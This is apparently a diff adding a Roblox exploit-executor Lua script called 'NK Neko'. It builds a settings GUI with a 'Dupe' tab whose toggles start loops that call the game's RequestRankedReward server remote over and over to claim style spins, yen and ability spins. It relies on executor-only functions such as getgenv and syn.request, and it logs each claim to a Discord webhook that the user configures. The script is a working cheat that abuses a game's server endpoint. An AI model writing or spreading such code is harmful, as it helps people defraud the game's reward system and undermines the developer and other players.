+	StyleSpins = false,
+	Yen = false,
+	Skills = false,
+	Delay = 0.7
+}
+
+local CONFIG_FILE = "NK_Neko_Settings_" .. tostring(player.UserId) .. ".json"
+local function saveConfig()
+	if writefile then pcall(function() writefile(CONFIG_FILE, HttpService:JSONEncode(SETTINGS)) end) end
+end
+local function loadConfig()
+	if readfile and isfile and isfile(CONFIG_FILE) then
+		pcall(function()
+			local decoded = HttpService:JSONDecode(readfile(CONFIG_FILE))
+			if decoded then for k, v in pairs(decoded) do if SETTINGS[k] ~= nil then SETTINGS[k] = v end end end
+		end)
+	end
+end
+loadConfig()
+
+local function createToggle(parent, text, settingKey, notifyStr)
+	local toggleContainer = Instance.new("Frame")
+	toggleContainer.Size = UDim2.new(1, 0, 0, 42)
+	toggleContainer.BackgroundColor3 = theme.Sidebar
+	toggleContainer.Parent = parent
+	applyCorner(toggleContainer, 8)
+	applyStroke(toggleContainer, theme.Stroke, 1, 0.5)
+
+	local titleLbl = Instance.new("TextLabel")
+	titleLbl.Size = UDim2.new(0.7, 0, 1, 0)
+	titleLbl.Position = UDim2.new(0, 10, 0, 0)
+	titleLbl.BackgroundTransparency = 1
+	titleLbl.Text = text
+	titleLbl.TextColor3 = theme.TextPrimary
+	titleLbl.Font = Enum.Font.GothamBold
+	titleLbl.TextSize = 13
+	titleLbl.TextXAlignment = Enum.TextXAlignment.Left
+	titleLbl.Parent = toggleContainer
+
+	local switchBg = Instance.new("TextButton")
+	switchBg.Size = UDim2.new(0, 44, 0, 24)
+	switchBg.Position = UDim2.new(1, -54, 0.5, -12)
+	switchBg.BackgroundColor3 = SETTINGS[settingKey] and theme.Accent or theme.ItemBG
+	switchBg.Text = ""
+	switchBg.Parent = toggleContainer
+	applyCorner(switchBg, 12)
+	applyStroke(switchBg, theme.Stroke, 1, 0.5)
+
+	local knob = Instance.new("Frame")
+	knob.Size = UDim2.new(0, 18, 0, 18)
+	knob.Position = SETTINGS[settingKey] and UDim2.new(1, -21, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
+	knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	knob.BorderSizePixel = 0
+	knob.Parent = switchBg
+	applyCorner(knob, 9)
+
+	switchBg.MouseButton1Click:Connect(function()
+		SETTINGS[settingKey] = not SETTINGS[settingKey]
+		saveConfig()
+		local isToggled = SETTINGS[settingKey]
+		TweenService:Create(switchBg, TweenInfo.new(0.2), {BackgroundColor3 = isToggled and theme.Accent or theme.ItemBG}):Play()
+		TweenService:Create(knob, TweenInfo.new(0.2), {Position = isToggled and UDim2.new(1, -21, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)}):Play()
+		if isToggled and notifyStr then sendNotification("Toggled", notifyStr, theme.Accent) end
+	end)
+end
+
+local function createTextBox(parent, text, settingKey, placeholder)
+	local container = Instance.new("Frame")
+	container.Size = UDim2.new(1, 0, 0, 60)
+	container.BackgroundColor3 = theme.Sidebar
+	container.Parent = parent
+	applyCorner(container, 8)
+	applyStroke(container, theme.Stroke, 1, 0.5)
+
+	local titleLbl = Instance.new("TextLabel")
+	titleLbl.Size = UDim2.new(1, -20, 0, 20)
+	titleLbl.Position = UDim2.new(0, 10, 0, 5)
+	titleLbl.BackgroundTransparency = 1
+	titleLbl.Text = text
+	titleLbl.TextColor3 = theme.TextPrimary
+	titleLbl.Font = Enum.Font.GothamBold
+	titleLbl.TextSize = 13
+	titleLbl.TextXAlignment = Enum.TextXAlignment.Left
+	titleLbl.Parent = container
+
+	local input = Instance.new("TextBox")
+	input.Size = UDim2.new(1, -20, 0, 25)
+	input.Position = UDim2.new(0, 10, 0, 30)
+	input.BackgroundColor3 = theme.ItemBG
+	input.TextColor3 = theme.TextPrimary
+	input.Font = Enum.Font.Gotham
+	input.TextSize = 12
+	input.TextXAlignment = Enum.TextXAlignment.Left
+	input.PlaceholderText = placeholder or ""
+	input.Text = SETTINGS[settingKey] and tostring(SETTINGS[settingKey]) or ""
+	input.ClearTextOnFocus = false
+	input.TextTruncate = Enum.TextTruncate.AtEnd
+	input.Parent = container
+	applyCorner(input, 4)
+	applyStroke(input, theme.Stroke, 1, 0.5)
+
+	input.FocusLost:Connect(function()
+		SETTINGS[settingKey] = input.Text
+		saveConfig()
+	end)
+end
+
+local pageDupe = createTab("Dupe")
+local pageWebhooks = createTab("Webhooks")
+local pageLogs = createTab("Logs")
+
+local secDupe = createSection(pageDupe, "Auto Farming")
+createToggle(secDupe, "Style Spins (Bronze 3)", "StyleSpins", "Style Spins Auto Started")
+createToggle(secDupe, "Yen (Bronze 3)", "Yen", "Yen Auto Started")
+createToggle(secDupe, "Ability Spins (Silver 2)", "Skills", "Ability Auto Started")
+
+local secWh = createSection(pageWebhooks, "Webhook Configuration")
+createTextBox(secWh, "Discord Webhook URL", "WEBHOOK_URL", "https://discord.com/api/webhooks/...")
+createToggle(secWh, "Send Successful Attempts Only", "WH_ON_SUCCESS", nil)
+
+local logContainer = Instance.new("ScrollingFrame")
+logContainer.Size = UDim2.new(1, 0, 1, 0)
+logContainer.BackgroundTransparency = 1
+logContainer.BorderSizePixel = 0
+logContainer.ScrollBarThickness = 3
+logContainer.ScrollBarImageColor3 = theme.Accent
+logContainer.Parent = pageLogs
+
+local logList = Instance.new("UIListLayout")
+logList.Parent = logContainer
+logList.SortOrder = Enum.SortOrder.LayoutOrder
+logList.Padding = UDim.new(0, 5)
+
+logList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+	logContainer.CanvasSize = UDim2.new(0, 0, 0, logList.AbsoluteContentSize.Y)
+	logContainer.CanvasPosition = Vector2.new(0, logList.AbsoluteContentSize.Y)
+end)
+
+local function guiLog(msg, color)
+	local l = Instance.new("TextLabel")
+	l.Size = UDim2.new(1, -10, 0, 20)
+	l.BackgroundTransparency = 1
+	l.Text = "[" .. os.date("%H:%M:%S") .. "] " .. msg
+	l.TextColor3 = color or theme.TextPrimary
+	l.Font = Enum.Font.Code
+	l.TextSize = 12
+	l.TextXAlignment = Enum.TextXAlignment.Left
+	l.Parent = logContainer
+
+	local children = logContainer:GetChildren()
+	local maxLogs = 100
+	local cList = {}
+	for _, c in ipairs(children) do
+		if c:IsA("TextLabel") then table.insert(cList, c) end
+	end
+	if #cList > maxLogs then cList[1]:Destroy() end
+end
+
+local function parseData(res)
+	if type(res) == "number" then return tostring(res) end
+	if type(res) == "string" then return res end
+	if type(res) == "table" then
+		local str = ""
+		for k, v in pairs(res) do str = str .. tostring(k) .. ":" .. tostring(v) .. " " end
+		return str ~= "" and str or "Success"
+	end
+	return "Success"
+end
+
+local function sendWebhook(title, rewardStr)
+	if not SETTINGS.WEBHOOK_URL or SETTINGS.WEBHOOK_URL == "" then return end
+	local data = {
+		embeds = {{
+			title = "🎉 " .. title,
+			description = "**Reward Given:** " .. rewardStr .. "\n\n**Player:** " .. player.DisplayName,
+			color = 9055202,
+			timestamp = DateTime.now():ToIsoDate()
+		}},
+		username = "NK - Neko Webhooks"
+	}
+	local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+	if _req then
+		task.spawn(function()
+			pcall(function()
+				_req({Url = SETTINGS.WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+			end)
+		end)
+	end
+end
+
+local RemotePath = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.7.0"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("SeasonService"):WaitForChild("RF"):WaitForChild("RequestRankedReward")
+
+task.spawn(function()
+	while task.wait(0.1) do
+		if getgenv().NK_Neko_Unloaded or getgenv().NK_Neko_InstanceId ~= scriptId then break end
+		if SETTINGS.StyleSpins then
+			local s, r = pcall(function() return RemotePath:InvokeServer(1) end)
+			if s and r and tostring(r) ~= "false" then
+				local parsed = parseData(r)
+				guiLog("Style Spins Claimed! Reward: " .. parsed, theme.Success)
+				if SETTINGS.WH_ON_SUCCESS then sendWebhook("Style Spins Claimed", parsed) end
+			end
+		end
+	end
+end)
+
+task.spawn(function()
+	while task.wait(SETTINGS.Delay) do
+		if getgenv().NK_Neko_Unloaded or getgenv().NK_Neko_InstanceId ~= scriptId then break end
+		if SETTINGS.Yen then
+			local s, r = pcall(function() return RemotePath:InvokeServer(2) end)
+			if s and r and tostring(r) ~= "false" then
+				local parsed = parseData(r)
+				guiLog("Yen Claimed! Reward: " .. parsed, theme.Success)
+				if SETTINGS.WH_ON_SUCCESS then sendWebhook("Yen Claimed", parsed) end
+			end
+		end
+		if SETTINGS.Skills then
+			local s, r = pcall(function() return RemotePath:InvokeServer(4) end)
+			if s and r and tostring(r) ~= "false" then
+				local parsed = parseData(r)
+				guiLog("Ability Spins Claimed! Reward: " .. parsed, theme.Success)
+				if SETTINGS.WH_ON_SUCCESS then sendWebhook("Ability Spins Claimed", parsed) end
+			end
+		end
+	end
+end)
+
+guiLog("NekoSpins Loaded Successfully.", theme.Accent)
